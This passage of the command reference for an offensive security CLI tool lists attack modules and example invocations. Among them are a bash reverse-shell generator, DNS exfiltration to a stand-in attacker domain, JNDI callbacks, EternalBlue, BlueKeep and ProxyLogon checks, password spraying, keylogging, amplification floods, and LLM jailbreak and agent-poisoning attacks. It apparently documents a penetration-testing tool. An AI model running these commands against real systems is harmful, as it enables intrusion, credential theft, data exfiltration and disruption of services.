pledgestrike shell generate --shell-type bash --ip 10.0.0.1 --port 4444 --base64
```

### `exfil` — Exfiltration Tester
| Subcommand | Description |
|------------|-------------|
| `dns` | DNS tunneling exfiltration |
| `icmp` | ICMP exfiltration simulation |
| `http` | HTTP exfiltration |
| `stego` | Steganographic exfiltration via headers |

```
pledgestrike exfil dns --domain exfil.attacker.com --data "secret_data"
pledgestrike exfil icmp --host target.com --data "secret_data"
pledgestrike exfil http --url https://target.com/upload --data "secret_data"
pledgestrike exfil stego --url https://target.com --data "secret_data"
```

---

## AI/LLM Security

### `llm` — LLM Prompt Injection
| Subcommand | Description |
|------------|-------------|
| `inject` | Direct/indirect prompt injection |
| `jailbreak` | LLM jailbreak |
| `leak` | Data leak via LLM |
| `hijack` | LLM hijack |

```
pledgestrike llm inject --url https://target.com/chat
pledgestrike llm jailbreak --url https://target.com/chat
pledgestrike llm leak --url https://target.com/chat
pledgestrike llm hijack --url https://target.com/chat
```

### `agent` — AI Agent Abuse
| Subcommand | Description |
|------------|-------------|
| `tool` | Tool injection |
| `rag` | RAG poisoning |
| `memory` | Memory manipulation |
| `plugin` | Plugin exploitation |

```
pledgestrike agent tool --url https://target.com/agent
pledgestrike agent rag --url https://target.com/agent
pledgestrike agent memory --url https://target.com/agent
pledgestrike agent plugin --url https://target.com/agent
```

---

## JNDI & Injection

### `jndi` — JNDI Injector
| Subcommand | Description |
|------------|-------------|
| `ldap` | LDAP injection |
| `rmi` | RMI injection |
| `dns` | DNS injection |
| `gadget` | Gadget chain delivery |

```
pledgestrike jndi ldap --url https://target.com/api --callback attacker.com
pledgestrike jndi rmi --url https://target.com/api --callback attacker.com
pledgestrike jndi dns --url https://target.com/api --callback attacker.com
pledgestrike jndi gadget --url https://target.com/api --callback attacker.com --cmd id
```

### `ldapi` — LDAP Injection
| Subcommand | Description |
|------------|-------------|
| `filter` | LDAP filter injection |
| `blind` | Blind LDAP injection |
| `enum` | LDAP enumeration |
| `ad` | Active Directory abuse |

```
pledgestrike ldapi filter --url https://target.com/api --param username
pledgestrike ldapi blind --url https://target.com/api --param username
pledgestrike ldapi enum --url ldap://target.com
pledgestrike ldapi ad --url ldap://dc.target.com
```

---

## Network Protocols (IoT/OT)

### `mqtt` — MQTT/IoT Broker
| Subcommand | Description |
|------------|-------------|
| `connect` | Auth bypass connection |
| `topic` | Topic wildcard subscription |
| `retain` | Retained message test |
| `will` | LWT injection |

```
pledgestrike mqtt connect --url mqtt://target.com:1883
pledgestrike mqtt topic --url mqtt://target.com:1883
pledgestrike mqtt retain --url mqtt://target.com:1883
pledgestrike mqtt will --url mqtt://target.com:1883
```

### `ot` — OT/ICS/SCADA
| Subcommand | Description |
|------------|-------------|
| `modbus` | Modbus protocol test |
| `enum` | Device enumeration |
| `write` | Write test |
| `hmi` | HMI exposure test |

```
pledgestrike ot modbus --url tcp://target.com:502
pledgestrike ot enum --url tcp://target.com:502
pledgestrike ot write --url tcp://target.com:502
pledgestrike ot hmi --url https://target.com/hmi
```

### `ble` — Bluetooth/BLE Recon
| Subcommand | Description |
|------------|-------------|
| `scan` | BLE device scan |
| `gatt` | GATT enumeration |
| `write` | GATT write test |
| `mitm` | MITM relay |

```
pledgestrike ble scan --url ble://target
pledgestrike ble gatt --url ble://target
pledgestrike ble write --url ble://target
pledgestrike ble mitm --url ble://target
```

### `coap` — CoAP/IoT Protocol
| Subcommand | Description |
|------------|-------------|
| `discover` | Resource discovery |
| `amplify` | Amplification test |
| `access` | Unauthorized access |
| `cache` | Cache poisoning |

```
pledgestrike coap discover --url coap://target.com:5683
pledgestrike coap amplify --url coap://target.com:5683
pledgestrike coap access --url coap://target.com:5683
pledgestrike coap cache --url coap://target.com:5683
```

### `ntp` — NTP Abuse
| Subcommand | Description |
|------------|-------------|
| `monlist` | monlist amplification |
| `amplify` | Amplification test |
| `time` | Time manipulation |
| `peek` | Private mode peek |

```
pledgestrike ntp monlist --url ntp://target.com
pledgestrike ntp amplify --url ntp://target.com
pledgestrike ntp time --url ntp://target.com
pledgestrike ntp peek --url ntp://target.com
```

---

## Network Services

### `smtp` — SMTP/Mail Attack
| Subcommand | Description |
|------------|-------------|
| `relay` | Open relay test |
| `inject` | Header injection |
| `spf` | SPF/DKIM/DMARC bypass |
| `command` | Command injection |

```
pledgestrike smtp relay --url smtp://target.com:25
pledgestrike smtp inject --url smtp://target.com:25
pledgestrike smtp spf --url smtp://target.com:25
pledgestrike smtp command --url smtp://target.com:25
```

### `ftp` — FTP Server Attack
| Subcommand | Description |
|------------|-------------|
| `anon` | Anonymous access test |
| `bounce` | Bounce scan |
| `traverse` | Directory traversal |
| `backdoor` | Backdoor check |

```
pledgestrike ftp anon --url ftp://target.com:21
pledgestrike ftp bounce --url ftp://target.com:21
pledgestrike ftp traverse --url ftp://target.com:21
pledgestrike ftp backdoor --url ftp://target.com:21
```

### `smb` — SMB/NetBIOS Attack
| Subcommand | Description |
|------------|-------------|
| `enum` | Share enumeration |
| `null` | Null session test |
| `eternal` | EternalBlue check |
| `relay` | SMB relay |

```
pledgestrike smb enum --url smb://target.com
pledgestrike smb null --url smb://target.com
pledgestrike smb eternal --url smb://target.com
pledgestrike smb relay --url smb://target.com
```

### `rdp` — RDP Attack
| Subcommand | Description |
|------------|-------------|
| `enum` | RDP enumeration |
| `bluekeep` | BlueKeep check |
| `cred` | Credential stuffing |
| `nla` | NLA bypass |

```
pledgestrike rdp enum --url rdp://target.com:3389
pledgestrike rdp bluekeep --url rdp://target.com:3389
pledgestrike rdp cred --url rdp://target.com:3389
pledgestrike rdp nla --url rdp://target.com:3389
```

### `ssh` — SSH Audit
| Subcommand | Description |
|------------|-------------|
| `audit` | Protocol audit |
| `cipher` | Weak cipher detection |
| `enum` | User enumeration |
| `agent` | Agent forwarding test |

```
pledgestrike ssh audit --url ssh://target.com:22
pledgestrike ssh cipher --url ssh://target.com:22
pledgestrike ssh enum --url ssh://target.com:22
pledgestrike ssh agent --url ssh://target.com:22
```

### `snmp` — SNMP Attack
| Subcommand | Description |
|------------|-------------|
| `brute` | Community string brute |
| `dump` | Info dump |
| `write` | Write test |
| `amplify` | Amplification test |

```
pledgestrike snmp brute --url snmp://target.com:161
pledgestrike snmp dump --url snmp://target.com:161
pledgestrike snmp write --url snmp://target.com:161
pledgestrike snmp amplify --url snmp://target.com:161
```

### `redisx` — Redis Exploit
| Subcommand | Description |
|------------|-------------|
| `access` | Unauthorized access |
| `rce` | RCE via Redis |
| `lua` | Lua scripting abuse |
| `exfil` | Data exfiltration |

```
pledgestrike redisx access --url redis://target.com:6379
pledgestrike redisx rce --url redis://target.com:6379
pledgestrike redisx lua --url redis://target.com:6379
pledgestrike redisx exfil --url redis://target.com:6379
```

### `elastic` — Elasticsearch Attack
| Subcommand | Description |
|------------|-------------|
| `expose` | Exposure detection |
| `dump` | Data exfiltration |
| `script` | Script injection |
| `reindex` | Reindex abuse |

```
pledgestrike elastic expose --url https://target.com:9200
pledgestrike elastic dump --url https://target.com:9200
pledgestrike elastic script --url https://target.com:9200
pledgestrike elastic reindex --url https://target.com:9200
```

### `amqp` — AMQP/RabbitMQ Attack
| Subcommand | Description |
|------------|-------------|
| `access` | Unauthorized access |
| `inject` | Message injection |
| `flood` | Queue flooding |
| `mgmt` | Management API abuse |

```
pledgestrike amqp access --url amqp://target.com:5672
pledgestrike amqp inject --url amqp://target.com:5672
pledgestrike amqp flood --url amqp://target.com:5672
pledgestrike amqp mgmt --url http://target.com:15672
```

### `ipmi` — IPMI Attack
| Subcommand | Description |
|------------|-------------|
| `cipher0` | Cipher 0 bypass |
| `default` | Default credentials |
| `dump` | BMC info dump |
| `bmc` | BMC exploitation |

```
pledgestrike ipmi cipher0 --url ipmi://target.com
pledgestrike ipmi default --url ipmi://target.com
pledgestrike ipmi dump --url ipmi://target.com
pledgestrike ipmi bmc --url ipmi://target.com
```

### `memcache` — Memcached Attack
| Subcommand | Description |
|------------|-------------|
| `access` | Unauthorized access |
| `stats` | Stats dump |
| `dump` | Data dump |
| `slab` | Slab exploitation |

```
pledgestrike memcache access --url memcache://target.com:11211
pledgestrike memcache stats --url memcache://target.com:11211
pledgestrike memcache dump --url memcache://target.com:11211
pledgestrike memcache slab --url memcache://target.com:11211
```

### `mongo` — MongoDB Attack
| Subcommand | Description |
|------------|-------------|
| `access` | Unauthorized access |
| `dump` | Data dump |
| `inject` | NoSQL injection |
| `enum` | Enumeration |

```
pledgestrike mongo access --url mongodb://target.com:27017
pledgestrike mongo dump --url mongodb://target.com:27017
pledgestrike mongo inject --url mongodb://target.com:27017
pledgestrike mongo enum --url mongodb://target.com:27017
```

### `vnc` — VNC Attack
| Subcommand | Description |
|------------|-------------|
| `access` | Unauthorized access |
| `brute` | Credential brute |
| `bypass` | Auth bypass |
| `enum` | Enumeration |

```
pledgestrike vnc access --url vnc://target.com:5900
pledgestrike vnc brute --url vnc://target.com:5900
pledgestrike vnc bypass --url vnc://target.com:5900
pledgestrike vnc enum --url vnc://target.com:5900
```

### `telnet` — Telnet Attack
| Subcommand | Description |
|------------|-------------|
| `brute` | Credential brute |
| `enum` | Enumeration |
| `inject` | Command injection |
| `banner` | Banner grab |

```
pledgestrike telnet brute --url telnet://target.com:23
pledgestrike telnet enum --url telnet://target.com:23
pledgestrike telnet inject --url telnet://target.com:23
pledgestrike telnet banner --url telnet://target.com:23
```

### `sip` — SIP/VoIP Attack
| Subcommand | Description |
|------------|-------------|
| `enum` | Enumeration |
| `brute` | Credential brute |
| `register` | Registration attack |
| `invite` | INVITE attack |

```
pledgestrike sip enum --url sip://target.com:5060
pledgestrike sip brute --url sip://target.com:5060
pledgestrike sip register --url sip://target.com:5060
pledgestrike sip invite --url sip://target.com:5060
```

### `rtsp` — RTSP Camera Attack
| Subcommand | Description |
|------------|-------------|
| `enum` | Enumeration |
| `brute` | Credential brute |
| `stream` | Stream access |
| `cred` | Default credential test |

```
pledgestrike rtsp enum --url rtsp://target.com:554
pledgestrike rtsp brute --url rtsp://target.com:554
pledgestrike rtsp stream --url rtsp://target.com:554
pledgestrike rtsp cred --url rtsp://target.com:554
```

### `nfs` — NFS Exploitation
| Subcommand | Description |
|------------|-------------|
| `enum` | Enumeration |
| `mount` | Mount test |
| `export` | Export list |
| `access` | Unauthorized access |

```
pledgestrike nfs enum --url nfs://target.com
pledgestrike nfs mount --url nfs://target.com
pledgestrike nfs export --url nfs://target.com
pledgestrike nfs access --url nfs://target.com
```

### `x11` — X11 Attack
| Subcommand | Description |
|------------|-------------|
| `enum` | Enumeration |
| `keylog` | Keylogger |
| `screenshot` | Screenshot capture |
| `bypass` | Auth bypass |

```
pledgestrike x11 enum --url x11://target.com:6000
pledgestrike x11 keylog --url x11://target.com:6000
pledgestrike x11 screenshot --url x11://target.com:6000
pledgestrike x11 bypass --url x11://target.com:6000
```

### `stomp` — STOMP Messaging Attack
| Subcommand | Description |
|------------|-------------|
| `connect` | Connection test |
| `inject` | Message injection |
| `flood` | Queue flooding |
| `enum` | Enumeration |

```
pledgestrike stomp connect --url stomp://target.com:61613
pledgestrike stomp inject --url stomp://target.com:61613
pledgestrike stomp flood --url stomp://target.com:61613
pledgestrike stomp enum --url stomp://target.com:61613
```

### `tftp` — TFTP Attack
| Subcommand | Description |
|------------|-------------|
| `read` | File read |
| `write` | File write |
| `brute` | Path brute force |
| `enum` | Enumeration |

```
pledgestrike tftp read --url tftp://target.com:69
pledgestrike tftp write --url tftp://target.com:69
pledgestrike tftp brute --url tftp://target.com:69
pledgestrike tftp enum --url tftp://target.com:69
```

### `finger` — Finger Protocol Recon
| Subcommand | Description |
|------------|-------------|
| `enum` | User enumeration |
| `brute` | Brute force |
| `redirect` | Redirect attack |
| `bomb` | Finger bomb |

```
pledgestrike finger enum --url finger://target.com:79
pledgestrike finger brute --url finger://target.com:79
pledgestrike finger redirect --url finger://target.com:79
pledgestrike finger bomb --url finger://target.com:79
```

### `zookeeper` — ZooKeeper Attack
| Subcommand | Description |
|------------|-------------|
| `env` | Environment dump |
| `dump` | Data dump |
| `brute` | Credential brute |
| `srvr` | Server info |

```
pledgestrike zookeeper env --url zk://target.com:2181
pledgestrike zookeeper dump --url zk://target.com:2181
pledgestrike zookeeper brute --url zk://target.com:2181
pledgestrike zookeeper srvr --url zk://target.com:2181
```

### `etcd` — etcd Attack
| Subcommand | Description |
|------------|-------------|
| `access` | Unauthorized access |
| `dump` | Data dump |
| `keys` | Key enumeration |
| `auth` | Auth bypass |

```
pledgestrike etcd access --url https://target.com:2379
pledgestrike etcd dump --url https://target.com:2379
pledgestrike etcd keys --url https://target.com:2379
pledgestrike etcd auth --url https://target.com:2379
```

### `upnp` — UPnP/SSDP Attack
| Subcommand | Description |
|------------|-------------|
| `discover` | Discovery |
| `expose` | Port exposure |
| `inject` | SOAP injection |
| `flood` | Amplification flood |

```
pledgestrike upnp discover --url http://target.com:1900
pledgestrike upnp expose --url http://target.com:1900
pledgestrike upnp inject --url http://target.com:1900
pledgestrike upnp flood --url http://target.com:1900
```

---

## Microsoft/Enterprise

### `winrm` — WinRM Attack
| Subcommand | Description |
|------------|-------------|
| `brute` | Brute force |
| `exec` | Remote execution |
| `enum` | Enumeration |
| `lateral` | Lateral movement |

```
pledgestrike winrm brute --url https://target.com:5986
pledgestrike winrm exec --url https://target.com:5986
pledgestrike winrm enum --url https://target.com:5986
pledgestrike winrm lateral --url https://target.com:5986
```

### `exchange` — Exchange Exploitation
| Subcommand | Description |
|------------|-------------|
| `proxylogon` | ProxyLogon (CVE-2021-26855) |
| `proxyshell` | ProxyShell (CVE-2021-34473) |
| `proxynotshell` | ProxyNotShell (CVE-2022-41040) |
| `enum` | Exchange enumeration |

```
pledgestrike exchange proxylogon --url https://target.com
pledgestrike exchange proxyshell --url https://target.com
pledgestrike exchange proxynotshell --url https://target.com
pledgestrike exchange enum --url https://target.com
```

### `owa` — OWA Attack
| Subcommand | Description |
|------------|-------------|
| `brute` | Brute force |
| `enum` | User enumeration |
| `spray` | Password spray |
| `rule` | Inbox rule injection |

```
pledgestrike owa brute --url https://target.com/owa
pledgestrike owa enum --url https://target.com/owa
pledgestrike owa spray --url https://target.com/owa
pledgestrike owa rule --url https://target.com/owa
```

### `sharepoint` — SharePoint Exploitation
| Subcommand | Description |
|------------|-------------|
| `enum` | Enumeration |
| `brute` | Brute force |
| `access` | Unauthorized access |
| `inject` | Injection |

```
pledgestrike sharepoint enum --url https://target.com/sites
pledgestrike sharepoint brute --url https://target.com/sites
pledgestrike sharepoint access --url https://target.com/sites
pledgestrike sharepoint inject --url https://target.com/sites
```

---

## Access Control

### `acl` — Access Control Tester
| Subcommand | Description |
|------------|-------------|
| `idor` | IDOR/BOLA — iterate resource IDs |
| `bfla` | BFLA — broken function level authorization |
| `privilege` | Privilege escalation — compare tokens |
| `path` | Forced browsing — discover hidden paths |

```
pledgestrike acl idor --url https://target.com/api/user/1 --start-id 1 --count 20
pledgestrike acl bfla --url https://target.com/api/admin
pledgestrike acl privilege --url https://target.com/api/admin --low-token <LOW_TOKEN> --token <HIGH_TOKEN>
pledgestrike acl path --url https://target.com --wordlist paths.txt
```

---

## Web3

### `web3` — Smart Contract Security
| Subcommand | Description |
|------------|-------------|
| `reentrancy` | Reentrancy vulnerability |
| `overflow` | Integer overflow |
| `access` | Access control |
| `delegatecall` | Delegatecall abuse |

```
pledgestrike web3 reentrancy --url https://target.com/contract
pledgestrike web3 overflow --url https://target.com/contract
pledgestrike web3 access --url https://target.com/contract
pledgestrike web3 delegatecall --url https://target.com/contract
```

---

## Summary

| Category | Modules | Subcommands |
|----------|---------|-------------|
| Web Application Attacks | 40 | 155 |
| SSRF & Infrastructure | 11 | 34 |
| Authentication & Identity | 8 | 30 |
| API & Protocol Testing | 9 | 34 |
| CI/CD & Supply Chain | 4 | 16 |
| Race Conditions | 2 | 7 |
| Payload & Exploit Tools | 6 | 22 |
| AI/LLM Security | 2 | 8 |
| JNDI & Injection | 2 | 8 |
| Network Protocols (IoT/OT) | 5 | 20 |
| Network Services | 20 | 80 |
| Microsoft/Enterprise | 4 | 16 |
| Access Control | 1 | 4 |
| Web3 | 1 | 4 |
| **Total** | **120** | **~478** |
